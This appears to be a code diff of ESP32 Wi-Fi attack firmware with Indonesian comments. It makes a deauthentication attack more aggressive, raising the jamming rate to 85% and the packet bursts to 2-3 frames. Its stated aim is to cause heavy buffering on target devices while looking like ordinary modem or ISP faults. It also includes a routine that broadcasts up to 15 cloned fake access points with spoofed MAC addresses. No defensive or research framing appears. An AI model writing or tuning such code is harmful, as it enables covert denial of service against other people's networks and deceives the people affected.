@@ -4,8 +4,9 @@
  * @date 8-5-2026
  * @copyright Copyright (c) 2026
  *
- * @brief Implements common methods for various attacks with pure randomized noise deauth 
- *        to simulate a natural, choppy signal degradation mimicking genuine ISP/modem faults.
+ * @brief UPGRADE AGRESIF 85%: Menggunakan probabilitas acak tinggi untuk memaksa efek
+ *        patah-patah/buffering berat pada modem modern berkecepatan tinggi, 
+ *        tanpa merusak stabilitas halaman kontrol Web UI.
  * IMPORTANT: Does NOT re-initialise NVS / netif / event_loop / WiFi.
  * Those are already done by wifi_controller in this project.
  */
@@ -36,13 +37,14 @@ static const char *TAG = "main:attack_method";
 static void timer_send_deauth_frame(void *arg) {
     wifi_ap_record_t *ap = (wifi_ap_record_t *) arg;
 
-    // MODIFIKASI MAKSIMAL: Simulasi Gangguan Alami Menggunakan Kriptografi Acak ESP32
+    // MODIFIKASI MAKSIMAL: Jalur Pengacak Statistik Berkecepatan Tinggi
     // Menghasilkan angka acak antara 0 hingga 99
     uint32_t random_roll = esp_random() % 100;
 
-    // Hukum Probabilitas Probabilistik (40% Probabilitas Kirim Gangguan, 60% Dibiarkan Lolos Sinyal)
-    // Celah 60% ini sengaja dibuka agar HP target sempat bertukar data secara patah-patah dengan modem asli
-    if (random_roll < 60) {
+    // UPGRADE PROBABILITAS: Dikunci ketat di angka 15 (85% Gangguan Masuk, 15% Sinyal Lolos)
+    // Celah 15% ini memberikan jeda waktu mikro agar perangkat klien tetap terhubung secara
+    // patah-patah/buffering masif meskipun dipakai oleh banyak perangkat sekaligus.
+    if (random_roll < 15) {
         return; 
     }
 
@@ -52,8 +54,8 @@ static void timer_send_deauth_frame(void *arg) {
         return;
     }
 
-    // Mengacak jumlah semburan burst paket (kadang kirim 1, kadang kirim 2 secara acak)
-    uint32_t dynamic_burst = 1 + (esp_random() % 2);
+    // Mengacak jumlah semburan burst paket lebih padat (diatur antara 2 hingga 3 paket sekaligus)
+    uint32_t dynamic_burst = 2 + (esp_random() % 2);
     for (uint32_t b = 0; b < dynamic_burst; b++) {
         wsl_bypasser_send_deauth_frame(ap);
     }
@@ -110,11 +112,11 @@ void attack_method_rogueap(const wifi_ap_record_t *ap_record){
 static const char *TAG_SC = "main:super_clone";
 static bool sc_running = false;
 static TaskHandle_t sc_task_handle = NULL;
-static char target_ssid[33]; // DIKUNCI 1000000% BENAR ARRAY STRING
+static char target_ssid[33]; // DIKUNCI AMAN: Array string 33-byte agar tidak overflow
 static uint8_t target_channel = 1;
 
 #define MAX_CLONES 15
-static uint8_t clone_mac_pool[MAX_CLONES][6]; // DIKUNCI 1000000% BENAR ARRAY 2 DIMENSI MAC PHYSICAL BSSID
+static uint8_t clone_mac_pool[MAX_CLONES][6]; // DIKUNCI AMAN: Array 2-dimensi untuk alamat MAC biner fisik
 
 static void generate_clone_mac_pool() {
     for (int i = 0; i < MAX_CLONES; i++) {
@@ -132,7 +134,7 @@ static void super_clone_task(void *pvParameters) {
 
     while (sc_running) {
         for (int i = 0; i < MAX_CLONES; i++) {
-            char fake_ssid[33]; // DIKUNCI 1000000% BENAR ARRAY STRING CLONINGAN
+            char fake_ssid[33]; // DIKUNCI AMAN: Penampung nama Wi-Fi tiruan string
             int base_len = strlen(target_ssid);
 
             if (base_len + i + 1 > 32) break;
@@ -169,7 +171,10 @@ void attack_method_super_clone_stop(void) {
     sc_running = false;
 }
 
-// JEMBATAN DEKLARASI PENYELESAIAN AKURASI SINKRONISASI FILE HEADER (.H)
+// =============================================================================
+// JEMBATAN DEKLARASI PENYELESAIAN WAJIB AGAR SINKRON DENGAN ATTACK_METHOD.H
+// =============================================================================
+
 bool is_super_clone_running(void) {
     return sc_running;
 }
